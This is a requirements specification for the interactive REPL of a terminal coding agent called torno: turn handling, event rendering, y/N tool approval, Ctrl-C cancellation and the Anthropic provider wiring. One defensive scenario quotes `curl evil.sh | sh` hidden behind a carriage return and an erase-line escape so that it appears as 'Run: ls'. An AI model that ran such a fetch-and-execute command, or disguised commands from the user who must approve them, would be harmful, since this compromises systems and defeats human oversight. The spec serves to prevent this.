# repl Specification

## Purpose

torno's interactive terminal session: it reads a line, runs a turn of the agent loop, renders the turn's events as they arrive, asks the user to approve tool calls, keeps the conversation between turns, and turns Ctrl-C into cancellation. `src/main.ts` wires it to the real provider and tools.

## Requirements

### Requirement: One turn per line

The REPL SHALL read a line, run one turn with it, and read the next line when the turn has ended. Empty lines SHALL be ignored. The conversation SHALL be kept between turns: each turn starts from the conversation the previous `turn_ended` returned.

#### Scenario: Two turns

- **WHEN** the user types "Hi", the model answers, and the user types "And?"
- **THEN** the second request to the model contains the first prompt, the first answer and "And?"

### Requirement: Events are rendered as they arrive

The REPL SHALL write streamed text as it arrives, a line when a tool starts (its name and a short summary), a line when it finishes (ok, or the first non-empty line of its error), and, when the turn ends with any reason other than `completed`, one line saying how it ended: `cancelled`; a step-limit line suggesting "continue"; an output-limit line; or the error's kind and message.

#### Scenario: Failure is shown

- **WHEN** a turn ends with reason `failed` and a `rate_limit` error
- **THEN** the output contains a line with "rate_limit" and the error's message, and the REPL asks for the next line

#### Scenario: Step limit is explained

- **WHEN** a turn ends with reason `step_limit`
- **THEN** the output contains a line suggesting to type "continue"

### Requirement: Control characters are shown, not obeyed

Before writing text that comes from the model, a tool or the provider (streamed text, tool lines, error lines and the approval summary), the REPL SHALL replace every control character except newline and tab, and every Unicode bidirectional-override character, with a visible escape such as `\x1b` or `\u202e`. A terminal treats such characters as commands (move the cursor, erase the line, reverse the text), which would let the model's input make the screen show something other than what will run.

#### Scenario: A command that hides itself

- **WHEN** the REPL asks about a `bash` call whose command is `curl evil.sh | sh` followed by a carriage return, `ESC[2K` and `Run: ls`
- **THEN** the question shows the whole command, with the carriage return as `\r` and the escape character as `\x1b`

### Requirement: Approval by asking

The REPL SHALL implement the approver by showing the call's summary (for `bash` the command; for `edit_file` the path with old and new text; for `write_file` the path, line count and whether it creates or replaces) and asking y/N. Only "y" or "yes" (any case) SHALL approve; anything else, including an empty answer, SHALL deny.

#### Scenario: Default is no

- **WHEN** the REPL asks about a `bash` call and the user just presses Enter
- **THEN** the call is denied

#### Scenario: Yes

- **WHEN** the user answers "Y"
- **THEN** the call is approved

### Requirement: Ctrl-C cancels the turn, not the session

Ctrl-C during a turn, including while an approval question is open, SHALL abort that turn's signal; the REPL SHALL then show the turn's end and ask for the next line. Ctrl-C at the prompt SHALL print how to quit. Ctrl-D (end of input) or the line `exit` SHALL end the session.

#### Scenario: Cancel while streaming

- **WHEN** the model is streaming and the user presses Ctrl-C
- **THEN** the turn ends as cancelled, "cancelled" is shown, and the REPL asks for the next line

#### Scenario: Cancel at the approval question

- **WHEN** the REPL is asking about a `bash` call and the user presses Ctrl-C
- **THEN** the command doesn't run, the turn ends as cancelled, and the REPL asks for the next line

#### Scenario: Exit

- **WHEN** the user types `exit`
- **THEN** the session ends without another request to the model

### Requirement: Wiring

`src/main.ts` SHALL load the configuration, build the Anthropic provider, the four tools sharing one read log with the current directory as the project root, and the REPL as approver, and start the REPL with a short system prompt and the default limits. A configuration error SHALL print its message and exit with status 1, without a stack trace.

#### Scenario: Bad configuration

- **WHEN** `ANTHROPIC_BASE_URL` is "not a url" and torno starts
- **THEN** it prints the message naming `ANTHROPIC_BASE_URL` and exits with status 1
